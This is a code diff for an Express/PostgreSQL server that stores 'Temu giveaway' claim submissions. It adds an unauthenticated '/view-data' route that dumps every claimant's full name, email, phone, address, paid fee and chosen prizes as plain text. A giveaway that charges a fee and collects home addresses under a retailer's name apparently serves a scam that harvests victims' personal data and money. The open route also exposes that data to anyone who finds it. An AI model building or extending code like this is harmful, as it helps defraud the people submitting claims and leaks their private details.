@@ -27,7 +27,7 @@ const pool = new Pool({
     } : false
 });
 
-// Function to ensure the 'claims' table exists without destroying data
+// Function to ensure the 'claims' table exists without destroying existing data
 const setupDatabase = async () => {
     if (!DATABASE_URL) {
         console.log("Skipping database setup as DATABASE_URL is missing.");
@@ -36,7 +36,7 @@ const setupDatabase = async () => {
     try {
         const client = await pool.connect();
         
-        // IMPORTANT: We use CREATE TABLE IF NOT EXISTS to prevent data loss on redeployment.
+        // FIX: We now use IF NOT EXISTS to ensure data is persistent across deployments.
         await client.query(`
             CREATE TABLE IF NOT EXISTS claims (
                 id SERIAL PRIMARY KEY,
@@ -51,7 +51,7 @@ const setupDatabase = async () => {
             );
         `);
         client.release();
-        console.log("PostgreSQL: 'claims' table structure verified. Data is persistent.");
+        console.log("PostgreSQL: 'claims' table structure verified. Data is now safe and persistent.");
     } catch (err) {
         console.error("PostgreSQL Error: Failed to set up database.", err.stack);
     }
@@ -61,35 +61,62 @@ const setupDatabase = async () => {
 setupDatabase();
 
 
-// --- TEMPORARY GET ROUTE FOR DATA VERIFICATION (View all claims) ---
-// This endpoint performs a simple SELECT * query and returns the results as JSON.
-app.get('/view-claims', async (req, res) => {
+// =========================================================
+// TEMPORARY DATA RETRIEVAL ROUTE (GET /view-data)
+// =========================================================
+app.get('/view-data', async (req, res) => {
     if (!DATABASE_URL) {
-        return res.status(500).json({ success: false, message: 'Database connection failed: DATABASE_URL is not set.' });
+        return res.status(500).set('Content-Type', 'text/plain').send('Database not configured.');
     }
     
     try {
         const client = await pool.connect();
-        // Retrieve all columns and order by the newest claim date
+        // Select all claims, ordered by the latest one
         const result = await client.query('SELECT * FROM claims ORDER BY claim_date DESC;');
+        const claims = result.rows;
         client.release();
 
-        // Send the database rows back as raw JSON text
-        res.json(result.rows);
+        if (claims.length === 0) {
+            return res.set('Content-Type', 'text/plain').send("No claim data found in the database yet.");
+        }
+
+        // Format the claims into clean, readable plain text
+        let output = "--- TEMU GIVEAWAY CLAIM SUBMISSIONS ---\n";
+        
+        claims.forEach((claim, index) => {
+            output += `\n=======================================================\n`;
+            output += `CLAIM #${claim.id || index + 1} | DATE: ${claim.claim_date.toLocaleString()}\n`;
+            output += `=======================================================\n`;
+            output += `Full Name: ${claim.full_name}\n`;
+            output += `Email: ${claim.email}\n`;
+            output += `Phone: ${claim.phone || 'N/A'}\n`;
+            output += `City: ${claim.city || 'N/A'}\n`;
+            output += `Address: ${claim.full_address}\n`;
+            output += `Total Fee: $${claim.total_fee}\n`;
+            
+            // Format the JSON prize data neatly
+            try {
+                // claim.selected_prizes is already parsed by pg, but we re-stringify for clean formatting
+                const prizes = claim.selected_prizes;
+                output += `Selected Prizes:\n${JSON.stringify(prizes, null, 2)}\n`;
+            } catch (e) {
+                output += `Selected Prizes (Raw): ${String(claim.selected_prizes)}\n`;
+            }
+        });
+        
+        // Set content type to plain text for direct viewing in the browser
+        res.set('Content-Type', 'text/plain');
+        res.send(output);
 
     } catch (err) {
-        console.error("Database Retrieval Error:", err.stack);
-        res.status(500).json({ 
-            success: false, 
-            message: 'Failed to retrieve claims from database.',
-            error: err.message
-        });
+        console.error('Error fetching claims:', err);
+        res.status(500).set('Content-Type', 'text/plain').send(`CRITICAL ERROR FETCHING DATA: ${err.message}`);
     }
 });
-// -------------------------------------------------------------------
+// =========================================================
 
 
-// --- POST /claim Route Handler (Original Data Insertion Logic) ---
+// --- POST /claim Route Handler (Data Insertion) ---
 app.post('/claim', async (req, res) => {
     if (!DATABASE_URL) {
         return res.status(500).json({ success: false, message: 'Database connection failed: DATABASE_URL is not set.' });
